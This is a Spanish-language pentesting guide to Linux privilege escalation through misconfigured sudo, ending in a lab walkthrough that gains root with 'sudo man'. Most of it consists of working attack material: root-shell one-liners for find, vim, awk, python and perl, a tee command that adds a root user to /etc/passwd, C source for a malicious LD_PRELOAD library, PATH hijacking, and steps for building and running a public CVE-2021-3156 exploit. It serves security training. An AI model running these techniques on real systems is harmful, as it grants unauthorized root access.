
# Misconfigured SUDO Privileges

Esta guía cubre las técnicas más comunes y efectivas para escalar privilegios en sistemas Linux mediante la explotación de configuraciones incorrectas en `sudo`. `sudo` permite a los usuarios ejecutar comandos con privilegios elevados, y una configuración inadecuada puede abrir puertas directas a la obtención de acceso `root`.

***

## <mark style="color:purple;">Enumeración inicial</mark>

El primer paso siempre es verificar los privilegios `sudo` del usuario actual. El comando `sudo -l` lista los comandos que el usuario puede ejecutar con `sudo` y bajo qué condiciones.

```bash
# Ver los privilegios del usuario actual
sudo -l

# Ver los privilegios de un usuario específico
sudo -l -U <nombre_usuario>

# Verificar si el usuario puede ejecutar comandos sin contraseña (NOPASSWD)
sudo -n true 2>/dev/null && echo "El usuario puede ejecutar sudo sin contraseña"
```

La salida de `sudo -l` puede mostrar configuraciones clave como:

* `NOPASSWD`: Permite ejecutar el comando sin proporcionar contraseña.
* `env_keep+=LD_PRELOAD` o `env_keep+=LD_LIBRARY_PATH`: Indica que se conservan variables de entorno peligrosas.
* Rutas absolutas o relativas de comandos.

***

## <mark style="color:purple;">Explotación de binarios comunes</mark>

Si `sudo -l` muestra que puedes ejecutar un binario específico como `root`, consulta la base de datos de **GTFOBins** (GTFOBins), que contiene métodos para abusar de binarios Unix y obtener una shell.

#### GTFO Bins V.1 (recomendada)

{% embed url="<https://web.archive.org/web/20260101045211/https://gtfobins.github.io/gtfobins/man/>" %}

#### GTFO Bins V.2

{% embed url="<https://gtfobins.org/>" %}

{% hint style="info" %}
**Nota:** `sudo` ejecuta los comandos con los privilegios del usuario objetivo (generalmente `root`), por lo que cualquier comando que pueda manipularse para ejecutar código arbitrario proporciona una escalada inmediata.
{% endhint %}

<table data-header-hidden><thead><tr><th width="146"></th><th></th></tr></thead><tbody><tr><td>Binario</td><td>Comando de explotación (si está permitido por sudo)</td></tr><tr><td><code>find</code></td><td><code>sudo find . -exec /bin/sh \; -quit</code></td></tr><tr><td><code>vim</code></td><td><code>sudo vim -c ':!/bin/sh'</code></td></tr><tr><td><code>awk</code></td><td><code>sudo awk 'BEGIN {system("/bin/sh")}'</code></td></tr><tr><td><code>python</code></td><td><code>sudo python -c 'import pty; pty.spawn("/bin/sh")'</code></td></tr><tr><td><code>perl</code></td><td><code>sudo perl -e 'exec "/bin/sh";'</code></td></tr><tr><td><code>bash</code> o <code>sh</code></td><td><code>sudo bash</code> o <code>sudo sh</code> (si no hay restricciones)</td></tr><tr><td><code>less</code> / <code>more</code></td><td><code>sudo less /etc/passwd</code> → dentro del comando: <code>! /bin/sh</code></td></tr><tr><td><code>nano</code></td><td><code>sudo nano</code> → <code>Ctrl+R</code> → <code>Ctrl+X</code> → <code>reset; sh 1>&#x26;0 2>&#x26;0</code></td></tr><tr><td><code>cp</code></td><td><code>sudo cp /etc/shadow /tmp/shadow</code> (copiar archivo restringido para leerlo)</td></tr><tr><td><code>cat</code></td><td><code>sudo cat /etc/shadow</code> (leer archivos restringidos directamente)</td></tr><tr><td><code>tee</code></td><td><code>echo "nuevo_usuario:x:0:0:root:/root:/bin/bash" | sudo tee -a /etc/passwd</code></td></tr></tbody></table>

***

## <mark style="color:purple;">Técnicas avanzadas de explotación</mark>

### **`NOPASSWD`: Ejecución sin contraseña**

Si `sudo -l` muestra la etiqueta `NOPASSWD` para algún comando, significa que el usuario puede ejecutarlo sin proporcionar su contraseña. Si el comando es un shell o un binario explotable (como `vim` o `find`), la escalada es inmediata.

```bash
# Ejemplo con vim y NOPASSWD
sudo -u root vim -c '!sh'
```

### **`LD_PRELOAD`: Inyección de bibliotecas maliciosas**

Si `sudo -l` muestra `env_keep+=LD_PRELOAD`, el sistema permite precargar bibliotecas compartidas antes de ejecutar un comando con `sudo`. Podemos compilar una biblioteca maliciosa que ejecute una shell.

```c
// /tmp/privEsc.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
```

Compilación y ejecución:

```bash
gcc -fPIC -shared -o privEsc.so /tmp/privEsc.c -nostartfiles
sudo LD_PRELOAD=./privEsc.so <comando_permitido>
# Ejemplo
sudo LD_PRELOAD=./privEsc.so /usr/bin/find
```

Cuando se ejecute el comando permitido, la biblioteca se cargará primero y lanzará una shell con privilegios de `root`.

### **`LD_LIBRARY_PATH`: Redirección de bibliotecas**

Si `env_keep+=LD_LIBRARY_PATH` está presente, podemos modificar la ruta de búsqueda de bibliotecas compartidas y hacer que el programa cargue una biblioteca maliciosa.

```bash
# Crear una biblioteca maliciosa (similar al caso LD_PRELOAD)
# Luego, establecer LD_LIBRARY_PATH para que apunte al directorio que contiene la biblioteca
sudo LD_LIBRARY_PATH=/tmp <comando_permitido>
```

### **Manipulación de rutas relativas y wildcards**

Si la regla de `sudo` no especifica una ruta absoluta (por ejemplo, `ls` en lugar de `/bin/ls`), podemos crear un binario malicioso con el mismo nombre y modificar la variable `PATH` para que se ejecute primero.

```bash
# Crear un script malicioso en un directorio escribible
echo '/bin/bash' > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
sudo ls  # Esto ejecutará /tmp/ls en lugar de /bin/ls
```

### **`sudoedit`: Edición de archivos sensibles**

`sudoedit` permite editar archivos con privilegios elevados. Si tenemos permiso para editar un archivo del sistema, podemos añadir líneas maliciosas.

```
# Editar /etc/sudoers para agregar un nuevo usuario con privilegios
sudoedit /etc/sudoers
# Agregar línea: usuario ALL=(ALL) NOPASSWD: ALL
```

***

## <mark style="color:purple;">Vulnerabilidades conocidas de SUDO</mark>

#### **4.1 CVE-2021-3156 (Baron Samedit)**

Esta vulnerabilidad es un desbordamiento de búfer en la función que escapa los caracteres de la línea de comandos en `sudo`. Afecta a versiones de `sudo` desde 1.8.2 hasta 1.8.31p2 y de 1.9.0 a 1.9.5p1. Cualquier usuario local (sin necesidad de tener privilegios) puede explotarla para obtener acceso `root`.

Para explotarla, se puede utilizar un exploit público:

```bash
# Clonar el repositorio de exploit
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich
```

#### **CVE-2025-32462 y CVE-2025-32463**

Vulnerabilidades más recientes en `sudo` que permiten escalada de privilegios. Herramientas como `SUDO_KILLER` incluyen detección para estas CVEs.

#### **`pkexec` (Polkit)**

Aunque no es estrictamente `sudo`, `pkexec` es otra herramienta que permite ejecutar comandos como otro usuario. Si se encuentra un binario SUID como `/usr/bin/pkexec`, puede ser vulnerable (por ejemplo, CVE-2021-4034).

```bash
# Verificar la versión de pkexec
pkexec --version
# Buscar exploits conocidos
searchsploit pkexec
```

***

## <mark style="color:purple;">Automatizar enumeración y explotación</mark>

### **LinPEAS**

LinPEAS enumera automáticamente configuraciones de `sudo` y sugiere vectores de escalada.

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### **sudo\_killer**

Herramienta específica para identificar y explotar configuraciones incorrectas de `sudo`.

```
git clone https://github.com/TH3xACE/SUDO_KILLER.git
cd SUDO_KILLER
chmod +x sudo_killer.sh
./sudo_killer.sh
```

### **GTFONow**

Herramienta que automatiza la escalada de privilegios utilizando GTFOBins.

```
git clone https://github.com/im-hanzou/GTFONow
cd GTFONow
python3 gtfonow.py
```

***

## <mark style="color:purple;">Cheatsheet</mark>

<table data-header-hidden><thead><tr><th width="335.33331298828125"></th><th></th></tr></thead><tbody><tr><td>Acción</td><td>Comando</td></tr><tr><td>Ver privilegios sudo</td><td><code>sudo -l</code></td></tr><tr><td>Ver si se puede ejecutar sin contraseña</td><td><code>sudo -n true 2>/dev/null &#x26;&#x26; echo "Sí"</code></td></tr><tr><td>Explotar <code>find</code></td><td><code>sudo find . -exec /bin/sh \; -quit</code></td></tr><tr><td>Explotar <code>vim</code></td><td><code>sudo vim -c ':!/bin/sh'</code></td></tr><tr><td>Explotar <code>awk</code></td><td><code>sudo awk 'BEGIN {system("/bin/sh")}'</code></td></tr><tr><td>Explotar <code>LD_PRELOAD</code></td><td>Compilar biblioteca y ejecutar <code>sudo LD_PRELOAD=./privEsc.so &#x3C;comando></code></td></tr><tr><td>Manipular <code>PATH</code></td><td><code>export PATH=/tmp:$PATH; sudo ls</code></td></tr><tr><td>Editar <code>/etc/sudoers</code></td><td><code>sudoedit /etc/sudoers</code></td></tr><tr><td>Explotar CVE-2021-3156</td><td><code>./sudo-hax-me-a-sandwich</code></td></tr><tr><td>Ejecutar LinPEAS</td><td><code>./linpeas.sh</code></td></tr><tr><td>Ejecutar SUDO_KILLER</td><td><code>./sudo_killer.sh</code></td></tr></tbody></table>

***

## <mark style="color:purple;">Lab:</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**Editing Gone Wrong**</mark>

Has logrado acceder a la cuenta "student" en el servidor del cliente. Esto ya es bastante grave, ya que tienes acceso a todos los recursos para estudiantes. Ahora intentas escalar privilegios para obtener acceso de administrador. Tras investigar un poco y consultar otras fuentes, descubres que la misma persona en la organización utiliza tanto la cuenta de estudiante como la cuenta de administrador en el sistema.

¡Tu misión es elevar tus privilegios, obtener acceso de administrador al sistema y recuperar la flag!

Accedemos a

```bash
http://target.ine.local:8000/
```

### Comprobar privilegios

Vemos que podemos ejecutar man sin contraseña:

```bash
student@target:~$ sudo -l
Matching Defaults entries for student on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User student may run the following commands on target:
    (root) NOPASSWD: /usr/bin/man
```

### GTFO Bins

{% embed url="<https://web.archive.org/web/20260101045211/https://gtfobins.github.io/gtfobins/man/>" %}

Buscando en GTFO Bins el binario encontramos que ejecutando lo siguiente podríamos elevar privilegios:

```bash
sudo man man
!/bin/sh
```

#### Explotación

```bash
student@target:~$ sudo man man

MAN(1)                                                                  Manual pager utils                                                                 MAN(1)

NAME
       man - an interface to the on-line reference manuals

SYNOPSIS
       man  [-C  file]  [-d] [-D] [--warnings[=warnings]] [-R encoding] [-L locale] [-m system[,...]] [-M path] [-S list] [-e extension] [-i|-I] [--regex|--wild-
       card] [--names-only] [-a] [-u] [--no-subpages] [-P pager] [-r  prompt]  [-7]  [-E  encoding]  [--no-hyphenation]

<---SNIP--->
DESCRIPTION
       man is the system's manual pager.  Each page argument given to man is normally the name of a program, utility
       or function.  The manual page associated with each of these arguments is then found and  displayed.   A  sec-
       tion,  if  provided,  will  direct  man to look only in that section of the manual.  The default action is to

!/bin/sh
# whoami
root
```

### Acceso a la flag

```bash
# cd /root
# ls
flag
# cat flag
74f5cc752947ec8a522f9c49********
```
